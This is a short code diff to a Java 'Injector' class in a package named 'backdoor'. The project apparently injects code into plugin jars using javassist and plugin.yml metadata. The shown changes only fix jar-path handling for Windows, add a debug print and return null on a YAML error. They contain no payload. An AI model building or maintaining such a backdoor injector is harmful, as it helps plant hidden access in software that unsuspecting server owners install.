@@ -1,6 +1,7 @@
 package com.thiccindustries.backdoor;
 
 import javassist.*;
+import org.apache.commons.lang.SystemUtils;
 import org.yaml.snakeyaml.Yaml;
 
 import javax.swing.*;
@@ -65,6 +66,7 @@ public class Injector {
         /*--- Read Plugin Metadata ---*/
 
         System.out.println("[Injector] Reading plugin data for file: " + input.getFileName());
+        System.out.println(input.toAbsolutePath());
         Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString());
         String name = (String) pluginYAML.get("name");
         String mainClass = (String) pluginYAML.get("main");
@@ -177,7 +179,11 @@ public class Injector {
         InputStream is = null;
 
         //Get plugin.yml file path
-        String inputFile = "jar:file://" + path + "!/plugin.yml";
+        String inputFile = null;
+        if(SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC)
+            inputFile = "jar:file://" + path + "!/plugin.yml";
+        if(SystemUtils.IS_OS_WINDOWS)
+            inputFile = "jar:file:/" + path + "!/plugin.yml";
 
         try {
             if (inputFile.startsWith("jar:")) {
@@ -189,6 +195,7 @@ public class Injector {
             InjectorGUI.displayError("Error while reading plugin metadata.");
             System.out.println("[Injector] Unknown error whilst parsing plugin YAML.");
             e.printStackTrace();
+            return null;
         }
 
         return yamlData.load(is);
